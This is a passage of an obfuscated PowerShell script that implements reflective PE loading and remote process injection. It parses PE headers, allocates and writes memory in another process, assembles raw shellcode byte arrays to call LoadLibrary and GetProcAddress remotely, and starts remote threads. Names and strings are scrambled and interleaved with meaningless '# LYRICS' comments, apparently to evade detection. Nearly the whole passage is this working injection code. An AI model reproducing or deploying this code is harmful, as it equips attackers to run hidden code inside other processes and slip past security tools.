            }
# LYRICS422
            $VAR099::( "{2}{3}{0}{1}"-f 'lo','bal','Fre','eHG'  ).Invoke(  $VAR0146  )
        }
# LYRICS423
        Function f`Un014 {
# LYRICS424
            Param(  
                [Parameter(  PoSiTioN  = 1, MANDAToRY   =   $true  )]
                [IntPtr]
                $VAR0151,
# LYRICS425
                [Parameter(poSitiOn =   2, ManDATOrY = $true )]
                [IntPtr]
                $VAR0127,
# LYRICS426
                [Parameter(POSITION  =   3, maNDaTOrY = $false  )]
                [IntPtr]
                $VAR0152 =   $VAR095::"z`ErO",
# LYRICS427
                [Parameter( POsiTIon  =  4, MANDatORY   = $true  )]
                [System.Object]
                $VAR0042
              )
# LYRICS428
            [IntPtr]$VAR0149   =   $VAR095::"Z`erO"
# LYRICS429
            $VAR0150  =    (  &  (  "{0}{1}{2}" -f'GEt-v','ArIabl','E')  ("523"+  "0"  )  ).vAlue::"O`Sve`RsiON"."vErS`i`on"
# LYRICS430
# LYRICS431
            if (  ($VAR0150 -ge (   & (  "{0}{1}{2}"-f'New-O','bj','ect') (  "{1}{2}{0}"-f 'n','Versi','o') 6, 0 ) ) -and ( $VAR0150 -lt (  & ("{0}{1}{2}"-f 'N','ew-O','bject') ( "{0}{1}" -f'Ve','rsion' ) 6, 2) )) {
# LYRICS432
# LYRICS433
                $RetVal  = $VAR0042."f`U`N054"."i`NVOKE"( [Ref]$VAR0149, 0x1FFFFF, $VAR095::"zE`RO", $VAR0151, $VAR0127, $VAR0152, $false, 0, 0xffff, 0xffff, $VAR095::"Z`eRO")
# LYRICS434
# LYRICS435
                $VAR0153  =  $VAR099::(  "{0}{2}{4}{1}{3}"-f'Get','E','La','rror','stWin32' ).Invoke(    )
# LYRICS436
                if ($VAR0149 -eq $VAR095::"zE`RO" ) {
# LYRICS437
                    Throw ( 'E' +  'RROR63:'+  ' ' + "$RetVal. " +"$VAR0153")
                }
            }
# LYRICS438
            else {
# LYRICS439
                $VAR0149 =  $VAR0042."fUN0`47"."Inv`OKe"(  $VAR0151, $VAR095::"z`erO", [UIntPtr][UInt64]0xFFFF, $VAR0127, $VAR0152, 0, $VAR095::"Z`eRO"  )
            }
# LYRICS440
            if ($VAR0149 -eq $VAR095::"ZE`RO" ) {
# LYRICS441
                  & ("{0}{1}{2}"-f 'Wr','i','te-Error'  ) ( "{1}{0}" -f '4','ERROR6'  ) -ErrorAction (  "{0}{1}" -f'S','top'  )
            }
# LYRICS442
            return $VAR0149
        }
# LYRICS443
        Function FuN0`15 {
# LYRICS444
            Param(  
                [Parameter( PoSiTIon   = 0, MANdAtOrY =  $true )]
                [IntPtr]
                $VAR0263,
# LYRICS445
                [Parameter( poSITion = 1, mandATOry   = $true  )]
                [System.Object]
                $VAR010
              )
# LYRICS446
            $VAR0154  =   & (  "{2}{1}{3}{0}"-f't','Obj','New-','ec' ) (  "{0}{2}{1}"-f'Sys','ect','tem.Obj'  )
# LYRICS447
# LYRICS448
            $VAR0155  = $VAR099::"pT`Rt`O`StrU`CtURe"( $VAR0263, [Type]$VAR010."Cons`T1`23"  )
# LYRICS449
# LYRICS450
            [IntPtr]$VAR0156 = [IntPtr](   &("{0}{1}"-f'FUN0','05'  ) ( [Int64]$VAR0263  ) ( [Int64][UInt64]$VAR0155."cO`Nst1`41" ))
# LYRICS451
            $VAR0154  |    &  (  "{1}{2}{0}"-f'r','Add-','Membe'  ) -MemberType ( "{3}{2}{0}{1}"-f'e','rty','oteProp','N' ) -Name ( "{1}{0}{2}"-f'03','CONST','0' ) -Value $VAR0156
# LYRICS452
            $VAR0157   =  $VAR099::"ptRt`OS`TrUcTURE"( $VAR0156, [Type]$VAR010."ConsT0`31`64" )
# LYRICS453
# LYRICS454
            if (  $VAR0157."sI`gNatu`Re" -ne 0x00004550) {
                throw ("{0}{1}" -f 'ERRO','R65' )
            }
# LYRICS455
            if ( $VAR0157."ConST`1`22"."MaG`iC" -eq (  "{0}{2}{1}"-f'CONS','01','T1'  )) {
# LYRICS456
                $VAR0154  | &  ("{2}{0}{1}" -f 'd-','Member','Ad'  ) -MemberType ("{0}{3}{1}{2}" -f 'N','t','eProperty','o'  ) -Name ( "{1}{0}{2}" -f '03','CONST','1' ) -Value $VAR0157
# LYRICS457
                $VAR0154 | & ( "{0}{2}{1}" -f 'Add-Me','r','mbe') -MemberType (  "{2}{1}{0}"-f 'erty','eProp','Not') -Name ("{0}{1}" -f 'CON','ST032') -Value $true
            }
            else {
                $VAR0158   =   $VAR099::"PtRto`S`T`Ru`cTurE"( $VAR0156, [Type]$VAR010."conS`T03`132" )
# LYRICS458
                $VAR0154   |    &( "{0}{1}{2}"-f 'Add-M','embe','r' ) -MemberType ("{2}{0}{1}" -f'rope','rty','NoteP' ) -Name ( "{2}{0}{1}" -f 'NST0','31','CO' ) -Value $VAR0158
                $VAR0154   |   &  ( "{0}{1}{3}{2}"-f'Add-Me','m','er','b' ) -MemberType (  "{1}{2}{0}"-f'erty','NotePr','op') -Name ("{0}{1}{2}"-f 'CONS','T0','32') -Value $false
            }
# LYRICS459
            return $VAR0154
        }
# LYRICS460
# LYRICS461
# LYRICS462
        Function FUn0`16 {
# LYRICS463
            Param( 
                [Parameter(   pOsItIOn  =  0, maNdATory =   $true   )]
                [Byte[]]
                $VAR001,
# LYRICS464
                [Parameter( poSiTion   =  1, mAndAToRY   =   $true )]
                [System.Object]
                $VAR010
              )
# LYRICS465
            $VAR0126  =  &(  "{1}{0}{2}" -f '-O','New','bject') (  "{0}{1}{2}{3}"-f 'Sys','tem','.Objec','t' )
# LYRICS466
# LYRICS467
            [IntPtr]$VAR0159   =   $VAR099::( "{0}{1}{2}{3}" -f'Alloc','H','Glob','al' ).Invoke($VAR001."l`E`NGTH")
# LYRICS468
            $VAR099::("{1}{0}"-f'y','Cop').Invoke( $VAR001, 0, $VAR0159, $VAR001."L`eNGtH" )   |   & ("{2}{0}{1}"-f '-Nu','ll','Out'  )
# LYRICS469
# LYRICS470
            $VAR0154   =   &  (  "{1}{0}{2}"-f '1','FUN0','5') -VAR0263 $VAR0159 -VAR010 $VAR010
# LYRICS471
# LYRICS472
            $VAR0126  |   &( "{3}{2}{0}{1}"-f 'embe','r','-M','Add'  ) -MemberType ("{2}{3}{0}{1}" -f 'tePropert','y','N','o' ) -Name ("{1}{0}" -f '032','CONST' ) -Value ( $VAR0154."COns`T032" )
# LYRICS473
            $VAR0126 |  & (  "{0}{1}{2}"-f 'Add-','M','ember') -MemberType ( "{0}{2}{1}" -f 'N','roperty','oteP') -Name (  "{2}{0}{1}" -f 'AR01','96','V'  ) -Value (  $VAR0154."cOnSt031"."C`ons`T122"."cOn`st0`58"  )
            $VAR0126 |   &( "{2}{0}{1}{3}" -f 'd','d-Memb','A','er' ) -MemberType (  "{2}{0}{3}{1}" -f'op','ty','NotePr','er' ) -Name ("{0}{2}{1}"-f'CO','033','NST') -Value (  $VAR0154."c`ONS`T031"."Co`N`sT122"."con`ST033" )
# LYRICS474
            $VAR0126   |  &  (  "{1}{0}{2}{3}" -f 'd-M','Ad','embe','r'  ) -MemberType (  "{1}{3}{0}{2}" -f 'rt','N','y','otePrope' ) -Name ("{1}{0}{2}" -f'ONST0','C','34') -Value ($VAR0154."conSt031"."CON`st122"."c`ONS`T034" )
            $VAR0126  |   & ("{2}{1}{0}" -f'ember','dd-M','A' ) -MemberType ( "{1}{2}{0}{3}"-f 'pe','NotePr','o','rty') -Name (  "{1}{0}{2}" -f'ONST03','C','5') -Value (  $VAR0154."CO`NsT031"."cON`st122"."coNsT0`35" )
# LYRICS475
# LYRICS476
# LYRICS477
            $VAR099::("{1}{0}{2}"-f 'lo','FreeHG','bal').Invoke($VAR0159)
# LYRICS478
            return $VAR0126
        }
# LYRICS479
# LYRICS480
# LYRICS481
# LYRICS482
        Function FUn017 {
# LYRICS483
            Param(  
                [Parameter( POSITion =  0, MAndaTorY   = $true)]
                [IntPtr]
                $VAR0263,
# LYRICS484
                [Parameter(  poSitioN   =  1, mANDAtory  = $true)]
                [System.Object]
                $VAR010,
# LYRICS485
                [Parameter(  poSition  = 2, mAndaTory   = $true  )]
                [System.Object]
                $VAR0041
             )
# LYRICS486
            if (  $VAR0263 -eq $null -or $VAR0263 -eq $VAR095::"Ze`Ro") {
# LYRICS487
                throw (  "{1}{2}{0}" -f 'OR66','E','RR')
            }
# LYRICS488
            $VAR0126   =    &(  "{0}{1}{2}"-f 'New-Obj','ec','t') (  "{3}{0}{2}{1}" -f 'yste','ct','m.Obje','S')
# LYRICS489
# LYRICS490
            $VAR0154  =  & ("{1}{0}"-f'15','FUN0'  ) -VAR0263 $VAR0263 -VAR010 $VAR010
# LYRICS491
# LYRICS492
            $VAR0126  |    &  ("{2}{0}{3}{1}" -f '-Me','er','Add','mb' ) -MemberType ( "{0}{1}{2}{3}" -f'Note','Prop','e','rty' ) -Name (  "{1}{0}"-f'3','VAR026'  ) -Value $VAR0263
# LYRICS493
            $VAR0126 |    & ("{2}{0}{1}" -f 'd-Mem','ber','Ad'  ) -MemberType ( "{1}{0}{2}"-f'e','NoteProp','rty') -Name (  "{0}{2}{1}"-f 'CON','031','ST') -Value (  $VAR0154."CoNS`T031"  )
            $VAR0126  |  & ( "{1}{0}{2}"-f 'd','Ad','-Member') -MemberType (  "{1}{3}{0}{2}" -f'Prop','Not','erty','e') -Name (  "{0}{2}{1}"-f 'CONST10','0','0' ) -Value ($VAR0154."cON`ST0`30"  ) 
# LYRICS494
            $VAR0126 |  &("{2}{1}{3}{0}"-f'ember','dd-','A','M') -MemberType ("{2}{1}{3}{0}"-f 'ty','teProp','No','er'  ) -Name ( "{2}{1}{0}" -f'032','T','CONS' ) -Value (  $VAR0154."Co`NsT032"  )
            $VAR0126  |    &( "{1}{0}{2}" -f 'd-Memb','Ad','er' ) -MemberType ("{2}{1}{3}{0}" -f'perty','ePr','Not','o' ) -Name ("{2}{0}{1}" -f'03','3','CONST' ) -Value ( $VAR0154."co`Nst0`31"."cONst`122"."c`Ons`T033")
# LYRICS495
            if ($VAR0126."Con`ST0`32" -eq $true) {
                [IntPtr]$VAR0160   =   [IntPtr](  & (  "{1}{0}{2}"-f'UN0','F','05' ) ([Int64]$VAR0126."Co`NS`T1000"  ) (  $VAR099::"Si`ze`Of"(  [Type]$VAR010."c`O`Nst031`64"  )  ) )
# LYRICS496
                $VAR0126 |   &  ( "{2}{1}{3}{0}"-f'ember','-','Add','M'  ) -MemberType ("{3}{1}{0}{2}"-f'eProper','ot','ty','N' ) -Name (  "{0}{1}{2}" -f 'C','ONST','036') -Value $VAR0160
            }
            else {
                [IntPtr]$VAR0160   =  [IntPtr]( & ("{1}{0}"-f '005','FUN'  ) (  [Int64]$VAR0126."C`onST`1000") ( $VAR099::"SIZe`of"([Type]$VAR010."CO`NsT03`132") ) )
# LYRICS497
                $VAR0126  |  &  (  "{2}{3}{0}{1}" -f'M','ember','Add','-') -MemberType (  "{1}{2}{0}{3}"-f'e','Not','eProp','rty'  ) -Name ("{1}{2}{0}" -f'36','CONST','0'  ) -Value $VAR0160
            }
# LYRICS498
            if (($VAR0154."co`NST031"."co`NST1`21"."COnST0`67" -band $VAR0041."coNS`T022" ) -eq $VAR0041."cOns`T022" ) {
# LYRICS499
                $VAR0126 |    &( "{2}{0}{1}"-f'd-Me','mber','Ad'  ) -MemberType (  "{2}{1}{0}" -f 'perty','ePro','Not') -Name (  "{0}{1}{2}" -f'CON','ST03','7'  ) -Value ("{1}{0}"-f'rary','Lib')
            }
            elseif (  ( $VAR0154."coNS`T031"."co`N`st121"."ConS`T0`67" -band $VAR0041."c`oNST0`21" ) -eq $VAR0041."c`onst021") {
# LYRICS500
                $VAR0126   |    &("{1}{2}{3}{0}" -f 'er','A','dd-Mem','b') -MemberType ("{2}{1}{0}{3}" -f'r','ePrope','Not','ty') -Name ( "{0}{1}{2}"-f'C','ONST03','7' ) -Value ("{1}{2}{0}" -f'e','Ex','ecutabl')
            }
            else {
                Throw ("{1}{2}{0}" -f '8','ERROR','0'  )
            }
# LYRICS501
            return $VAR0126
        }
# LYRICS502
        Function fun018 {
# LYRICS503
            Param(  
                [Parameter(  PoSITIOn =  0, MandATOrY   = $true )]
                [IntPtr]
                $VAR0161,
# LYRICS504
                [Parameter( pOSitION  =  1, mANdaTorY   =  $true)]
                [IntPtr]
                $VAR0162
              )
# LYRICS505
            $VAR0163 =  $VAR099::"s`iZE`oF"( [Type][IntPtr])
# LYRICS506
# LYRICS507
            $VAR0164  = $VAR099::("{0}{2}{1}{3}{4}" -f'P','ToStr','tr','ing','Ansi'  ).Invoke($VAR0162  )
# LYRICS508
            $VAR0165 =  [UIntPtr][UInt64]([UInt64]$VAR0164."lE`NGTh"   +  1  )
            $VAR0166  =  $VAR0042."F`Un032"."INvO`KE"( $VAR0161, $VAR095::"z`eRo", $VAR0165, $VAR0041."c`On`st001" -bor $VAR0041."con`s`T002", $VAR0041."co`NsT005")
# LYRICS509
            if ($VAR0166 -eq $VAR095::"z`eRo"  ) {
                Throw ("{0}{1}" -f'ERRO','R09')
            }
# LYRICS510
            [UIntPtr]$VAR0167 =    ( &( "{1}{0}{2}" -f 'Ildit','GEt-cH','EM'  )  ( 'VaRIa'+  'ble' +  ':' + '32'+'1iu' ) ).vALue::"Z`Ero"
# LYRICS511
            $Success =   $VAR0042."fu`N045"."iN`VOke"($VAR0161, $VAR0166, $VAR0162, $VAR0165, [Ref]$VAR0167)
# LYRICS512
            if ($Success -eq $false) {
                Throw ( "{2}{1}{0}"-f '0','1','ERROR' )
            }
            if (  $VAR0165 -ne $VAR0167) {
                Throw (  "{1}{0}"-f'OR11','ERR' )
            }
# LYRICS513
            $VAR0168 =   $VAR0042."FUN041"."iNv`O`KE"(  $VAR0302)
# LYRICS514
            $VAR0169  =  $VAR0042."f`U`N036"."In`VoKe"( $VAR0168, ("{0}{2}{1}"-f'L','A','oadLibrary' ) ) 
# LYRICS515
            [IntPtr]$VAR0181   =   $VAR095::"zE`Ro"
# LYRICS516
# LYRICS517
            if ( $VAR0126."COn`s`T032" -eq $true  ) {
# LYRICS518
                $VAR0170 =   $VAR0042."FU`N032"."i`NVoKE"($VAR0161, $VAR095::"ze`RO", $VAR0165, $VAR0041."COnst001" -bor $VAR0041."c`onST002", $VAR0041."CON`ST005"  )
# LYRICS519
                if ( $VAR0170 -eq $VAR095::"z`ERo"  ) {
                    Throw (  "{1}{0}{2}" -f '1','ERROR','2'  )
                }
# LYRICS520
                [Byte[]]$VAR0174 =  83,72,137,227,72,131,236,32,102,131,228,192,72,185
# LYRICS521
                $VAR0175   =   72,186
                $VAR0176 = 255,210,72,186
# LYRICS522
                $VAR0177  =   72,137,2,72,137,220,91,195
# LYRICS523
                $VAR0171 = $VAR0174."l`eNG`TH"  +  $VAR0175."LENG`Th"   +  $VAR0176."lenG`Th"  +  $VAR0177."leNg`Th" + ($VAR0163 * 3)
# LYRICS524
                $VAR0172   =  $VAR099::(  "{2}{0}{3}{1}" -f 'ocHG','l','All','loba'  ).Invoke( $VAR0171  )
                $VAR0173 =  $VAR0172
# LYRICS525
                 &("{1}{0}" -f 'N010','FU' ) -Bytes $VAR0174 -VAR0129 $VAR0172
# LYRICS526
                $VAR0172   =    & ("{1}{0}"-f 'N005','FU') $VAR0172 (  $VAR0174."l`ENGth")
                $VAR099::("{3}{0}{2}{1}" -f'ru','reToPtr','ctu','St'  ).Invoke(  $VAR0166, $VAR0172, $false)
                $VAR0172 =    &  (  "{1}{0}"-f'N005','FU'  ) $VAR0172 ( $VAR0163 )
# LYRICS527
                 & ( "{1}{0}" -f '10','FUN0') -Bytes $VAR0175 -VAR0129 $VAR0172
                $VAR0172 =   &(  "{1}{0}"-f'N005','FU') $VAR0172 (  $VAR0175."LenG`Th"  )
# LYRICS528
                $VAR099::(  "{1}{0}{2}{3}" -f'tructu','S','reToPt','r' ).Invoke(  $VAR0169, $VAR0172, $false  )
                $VAR0172   =     & ("{0}{1}" -f'FU','N005') $VAR0172 (  $VAR0163  )
# LYRICS529
                &  ( "{1}{0}" -f 'N010','FU') -Bytes $VAR0176 -VAR0129 $VAR0172
                $VAR0172   =   &  ( "{2}{1}{0}" -f'N005','U','F') $VAR0172 ($VAR0176."L`engTH"  )
                $VAR099::( "{4}{1}{3}{0}{2}"-f'Pt','ru','r','ctureTo','St' ).Invoke($VAR0170, $VAR0172, $false)
                $VAR0172   = &  ("{1}{0}" -f'N005','FU' ) $VAR0172 ($VAR0163  )
                  &(  "{1}{0}" -f '010','FUN') -Bytes $VAR0177 -VAR0129 $VAR0172
# LYRICS530
                $VAR0172   = &("{1}{2}{0}" -f '5','FUN0','0'  ) $VAR0172 ($VAR0177."l`ENGtH"  )
# LYRICS531
                $VAR0178  =   $VAR0042."fUn032"."i`NVoKe"( $VAR0161, $VAR095::"Z`eRo", [UIntPtr][UInt64]$VAR0171, $VAR0041."cOnst001" -bor $VAR0041."COnS`T002", $VAR0041."C`o`Nst008" )
# LYRICS532
                if (  $VAR0178 -eq $VAR095::"Z`Ero"  ) {
# LYRICS533
                    Throw ("{2}{1}{0}" -f'OR13','R','ER')
                }
# LYRICS534
                $Success =  $VAR0042."FuN0`45"."Inv`okE"(  $VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167 )
# LYRICS535
                if ( ( $Success -eq $false  ) -or (  [UInt64]$VAR0167 -ne [UInt64]$VAR0171) ) {
                    Throw (  "{0}{1}" -f'ER','ROR14')
                }
# LYRICS536
                $VAR0179   =  & ("{1}{0}" -f'UN014','F' ) -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
# LYRICS537
                $VAR0144  =  $VAR0042."FUN044"."i`N`VOKE"($VAR0179, 20000 )
                if ( $VAR0144 -ne 0 ) {
                    Throw ( "{0}{1}"-f 'ERR','OR15'  )
                }
# LYRICS538
# LYRICS539
                [IntPtr]$VAR0180  = $VAR099::(  "{0}{1}{2}"-f 'AllocH','Glob','al' ).Invoke($VAR0163)
                $VAR0144   =   $VAR0042."F`UN046"."I`NV`OKE"($VAR0161, $VAR0170, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167  )
# LYRICS540
                if (  $VAR0144 -eq $false  ) {
                    Throw ( "{0}{1}{2}"-f 'E','RRO','R16' )
                }
                [IntPtr]$VAR0181 =   $VAR099::"Pt`RtOStRu`c`TuRe"( $VAR0180, [Type][IntPtr] )
# LYRICS541
                $VAR0042."fun039"."I`Nv`oKE"(  $VAR0161, $VAR0170, [UIntPtr][UInt64]0, $VAR0041."cO`NSt0`25")   |   &  ("{0}{1}{2}" -f 'Out-Nu','l','l' )
# LYRICS542
                $VAR0042."fuN0`39"."invo`ke"(  $VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041."CoN`St0`25") |  & ( "{0}{1}" -f 'Out-N','ull' )
            }
            else {
# LYRICS543
                [IntPtr]$VAR0179 =   & ( "{0}{2}{1}"-f 'F','014','UN') -VAR0151 $VAR0161 -VAR0127 $VAR0169 -VAR0152 $VAR0166 -VAR0042 $VAR0042
# LYRICS544
                $VAR0144 =   $VAR0042."Fun044"."iN`VokE"($VAR0179, 20000  )
                if ($VAR0144 -ne 0  ) {
                    Throw ("{0}{1}{2}" -f 'ERRO','R1','7.')
                }
# LYRICS545
                [Int32]$VAR0182  =   0
# LYRICS546
                $VAR0144 =   $VAR0042."Fun048"."INvO`Ke"($VAR0179, [Ref]$VAR0182  )
# LYRICS547
                if ((  $VAR0144 -eq 0 ) -or (  $VAR0182 -eq 0 ) ) {
                    Throw (  "{0}{2}{1}"-f 'ER','18','ROR' )
                }
# LYRICS548
                [IntPtr]$VAR0181   = [IntPtr]$VAR0182
            }
# LYRICS549
            $VAR0042."F`Un039"."I`Nvoke"(  $VAR0161, $VAR0166, [UIntPtr][UInt64]0, $VAR0041."CO`Nst025"  )  |   & ("{2}{0}{1}"-f'-','Null','Out'  )
# LYRICS550
            return $VAR0181
        }
# LYRICS551
        Function F`Un019 {
# LYRICS552
            Param(  
                [Parameter( PoSitIoN = 0, MANDatORy = $true)]
                [IntPtr]
                $VAR0161,
# LYRICS553
                [Parameter( POSItiOn =  1, maNDaTory   =   $true  )]
                [IntPtr]
                $VAR0183,
# LYRICS554
                [Parameter(  PoSITIon = 2, MANdaTORy  = $true )]
                [IntPtr]
                $VAR0184, 
# LYRICS555
                [Parameter(positioN  = 3, maNdATory = $true  )]
                [Bool]
                $VAR0185
            )
# LYRICS556
            $VAR0163 =   $VAR099::"s`IzEOf"([Type][IntPtr])
# LYRICS557
            [IntPtr]$VAR0186  =   $daeH::"ze`Ro"   
# LYRICS558
            if ( -not $VAR0185) {
# LYRICS559
                $VAR0187   =  $VAR099::( "{4}{0}{3}{1}{2}"-f'T','g','Ansi','oStrin','Ptr' ).Invoke( $VAR0184  )
# LYRICS560
# LYRICS561
# LYRICS562
                $VAR0188   =   [UIntPtr][UInt64]([UInt64]$VAR0187."LE`NgTh"   +   1)
# LYRICS563
                $VAR0186   = $VAR0042."f`U`N032"."iNvO`KE"(  $VAR0161, $VAR095::"zE`RO", $VAR0188, $VAR0041."Co`Nst001" -bor $VAR0041."co`N`st002", $VAR0041."CO`N`sT005")
# LYRICS564
                if ( $VAR0186 -eq $VAR095::"ZE`Ro") {
                    Throw ("{0}{1}"-f 'E','RROR17')
                }
# LYRICS565
                [UIntPtr]$VAR0167 =    $321IU::"ZE`RO"
# LYRICS566
                $Success  =  $VAR0042."fu`N045"."i`N`Voke"(  $VAR0161, $VAR0186, $VAR0184, $VAR0188, [Ref]$VAR0167)
# LYRICS567
                if (  $Success -eq $false  ) {
                    Throw (  "{1}{2}{0}"-f'ROR18','E','R'  )
                }
                if ( $VAR0188 -ne $VAR0167  ) {
                    Throw (  "{0}{1}{2}"-f'ERRO','R1','9')
                }
            }
# LYRICS568
            else {
                $VAR0186 =  $VAR0184
            }
# LYRICS569
# LYRICS570
            $VAR0168   =   $VAR0042."fU`N041"."inv`O`KE"($VAR0302  )
# LYRICS571
            $VAR0058 =   $VAR0042."fu`N036"."i`NVoke"($VAR0168, $VAR0312  ) 
# LYRICS572
# LYRICS573
            $VAR0189   =  $VAR0042."fun0`32"."INvO`kE"(  $VAR0161, $VAR095::"ze`Ro", [UInt64][UInt64]$VAR0163, $VAR0041."cON`st001" -bor $VAR0041."cOn`ST002", $VAR0041."CoNs`T005")
# LYRICS574
            if ( $VAR0189 -eq $VAR095::"Ze`Ro") {
# LYRICS575
                Throw (  "{0}{1}{2}" -f'ERR','O','R20' )
            }
# LYRICS576
# LYRICS577
# LYRICS578
            [Byte[]]$VAR0190   =  @(  )
            if (  $VAR0126."cO`NS`T032" -eq $true  ) {
                $VAR01901 =  83,72,137,227,72,131,236,32,102,131,228,192,72,185
# LYRICS579
                $VAR01902  =  72,186
                $VAR01903   =  72,184
# LYRICS580
                $VAR01904 = 255,208,72,185
                $VAR01905 =   72,137,1,72,137,220,91,195
            }
            else {
                $VAR01901   = 83,137,227,131,228,192,184
                $VAR01902 =   185
# LYRICS581
                $VAR01903 =   81,80,184
# LYRICS582
                $VAR01904  =   255,208,185
                $VAR01905 =  137,1,137,220,91,195
            }
            $VAR0171  =   $VAR01901."l`e`NGTh" + $VAR01902."L`EnG`Th"   + $VAR01903."lEN`gtH"   + $VAR01904."le`Ngth" +   $VAR01905."lENg`Th"   +   (  $VAR0163 * 4 )
# LYRICS583
            $VAR0172   =  $VAR099::("{2}{0}{1}" -f'locH','Global','Al' ).Invoke( $VAR0171 )
            $VAR0173 =   $VAR0172
# LYRICS584
            & (  "{1}{0}{2}" -f'UN0','F','10'  ) -Bytes $VAR01901 -VAR0129 $VAR0172
            $VAR0172  =   &  ("{1}{0}"-f '5','FUN00' ) $VAR0172 ($VAR01901."lEng`TH"  )
# LYRICS585
            $VAR099::(  "{2}{0}{1}{3}"-f'ucture','To','Str','Ptr').Invoke($VAR0183, $VAR0172, $false  )
            $VAR0172 =   & ( "{1}{2}{0}"-f '05','FU','N0') $VAR0172 ($VAR0163)
# LYRICS586
            & (  "{1}{0}"-f 'N010','FU' ) -Bytes $VAR01902 -VAR0129 $VAR0172
            $VAR0172 =   &(  "{0}{1}" -f 'F','UN005'  ) $VAR0172 ( $VAR01902."l`E`NgtH")
# LYRICS587
            $VAR099::(  "{0}{3}{1}{2}"-f'St','ureTo','Ptr','ruct' ).Invoke( $VAR0186, $VAR0172, $false )
            $VAR0172   =  &("{1}{2}{0}"-f 'N005','F','U'  ) $VAR0172 (  $VAR0163  )
            &( "{2}{0}{1}"-f 'UN01','0','F' ) -Bytes $VAR01903 -VAR0129 $VAR0172
            $VAR0172 =    &("{0}{2}{1}"-f'F','N005','U' ) $VAR0172 ($VAR01903."Le`NgTh")
# LYRICS588
            $VAR099::("{1}{2}{0}"-f 'tr','Struct','ureToP'  ).Invoke( $VAR0058, $VAR0172, $false)
            $VAR0172 =    & (  "{0}{1}{2}"-f'FUN','0','05' ) $VAR0172 ( $VAR0163)
              &  (  "{1}{0}" -f'10','FUN0' ) -Bytes $VAR01904 -VAR0129 $VAR0172
# LYRICS589
            $VAR0172 =     &( "{0}{2}{1}" -f 'FUN','05','0') $VAR0172 ($VAR01904."l`engtH"  )
            $VAR099::("{2}{0}{1}" -f 'cture','ToPtr','Stru').Invoke($VAR0189, $VAR0172, $false  )
# LYRICS590
            $VAR0172 = &  ("{1}{0}" -f'005','FUN' ) $VAR0172 ($VAR0163  )
              &( "{2}{1}{0}"-f'0','01','FUN'  ) -Bytes $VAR01905 -VAR0129 $VAR0172
            $VAR0172 = &(  "{2}{1}{0}"-f '5','0','FUN0' ) $VAR0172 ( $VAR01905."LENg`TH"  )
# LYRICS591
            $VAR0178 = $VAR0042."Fu`N032"."i`Nv`okE"(  $VAR0161, $VAR095::"ZE`RO", [UIntPtr][UInt64]$VAR0171, $VAR0041."cOn`s`T001" -bor $VAR0041."cON`St002", $VAR0041."cOnS`T008"  )
# LYRICS592
            if ( $VAR0178 -eq $VAR095::"ZE`RO" ) {
                Throw (  "{0}{1}" -f 'E','RROR21'  )
            }
            [UIntPtr]$VAR0167   =    (   &  (  "{0}{1}{3}{2}"-f'GET-','VAr','LE','iab' ) 321Iu  -VaL   )::"Z`eRo"
# LYRICS593
            $Success =  $VAR0042."FUN045"."IN`VO`KE"( $VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167  )
# LYRICS594
            if ( (  $Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)  ) {
                Throw (  "{2}{1}{0}"-f 'OR22','RR','E'  )
            }
# LYRICS595
            $VAR0179 =   & ( "{1}{0}"-f '4','FUN01') -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
# LYRICS596
            $VAR0144  = $VAR0042."Fu`N044"."invO`kE"($VAR0179, 20000)
            if ( $VAR0144 -ne 0 ) {
                Throw ( "{0}{1}{2}"-f'ER','RO','R23'  )
            }
# LYRICS597
# LYRICS598
            [IntPtr]$VAR0180  = $VAR099::( "{2}{1}{0}{3}" -f 'cHGlob','lo','Al','al'  ).Invoke(  $VAR0163  )
# LYRICS599
            $VAR0144  = $VAR0042."FUn046"."I`NV`OKE"( $VAR0161, $VAR0189, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167 )
# LYRICS600
            if (  ( $VAR0144 -eq $false ) -or (  $VAR0167 -eq 0  )  ) {
                Throw ( "{0}{1}{2}" -f 'ER','ROR2','4')
            }
            [IntPtr]$VAR0191   = $VAR099::"pTRTo`s`TrUctu`Re"(  $VAR0180, [Type][IntPtr])
# LYRICS601
# LYRICS602
            $VAR0042."Fu`N0`39"."InVo`Ke"( $VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041."CONs`T025" )   |    & ( "{0}{2}{1}"-f'Out','Null','-'  )
# LYRICS603
            $VAR0042."F`UN039"."InvO`KE"( $VAR0161, $VAR0189, [UIntPtr][UInt64]0, $VAR0041."co`N`St025"  ) |  & (  "{0}{2}{1}" -f'O','-Null','ut'  )
# LYRICS604
            if (  -not $VAR0185) {
# LYRICS605
                $VAR0042."fUN0`39"."InVo`kE"(  $VAR0161, $VAR0186, [UIntPtr][UInt64]0, $VAR0041."Co`NSt025")  |   &("{1}{0}{2}" -f 't-N','Ou','ull' )
            }
# LYRICS606
            return $VAR0191
        }
# LYRICS607
# LYRICS608
        Function fU`N020 {
# LYRICS609
            Param( 
                [Parameter(poSITIoN  =   0, mAnDaToRY   =  $true  )]
                [Byte[]]
                $VAR001,
# LYRICS610
                [Parameter(PositiON   =  1, mANDatORy = $true )]
                [System.Object]
                $VAR0126,
# LYRICS611
                [Parameter( PositION  = 2, MandaTORy   =   $true )]
                [System.Object]
                $VAR0042,
# LYRICS612
                [Parameter( pOSiTiON  = 3, MANDaToRY  =  $true)]
                [System.Object]
                $VAR010
            )
# LYRICS613
            for (  $i  =  0;  $i -lt $VAR0126."C`on`ST031"."CoNST1`21"."C`ON`st072";  $i++ ) {
# LYRICS614
                [IntPtr]$VAR0160   =   [IntPtr](&  ("{1}{0}" -f'5','FUN00' ) ([Int64]$VAR0126."CoN`sT036"  ) (  $i * $VAR099::"siZ`eOf"([Type]$VAR010."COn`st142"  )) )
                $VAR0192   =   $VAR099::"Pt`RT`oSTruCT`URe"($VAR0160, [Type]$VAR010."c`ONST1`42" )
# LYRICS615
# LYRICS616
# LYRICS617
                [IntPtr]$VAR0193 =   [IntPtr]( &(  "{0}{1}{2}" -f 'FU','N','005' ) (  [Int64]$VAR0126."VAr02`63" ) (  [Int64]$VAR0192."coN`S`T074"  ))
# LYRICS618
# LYRICS619
# LYRICS620
# LYRICS621
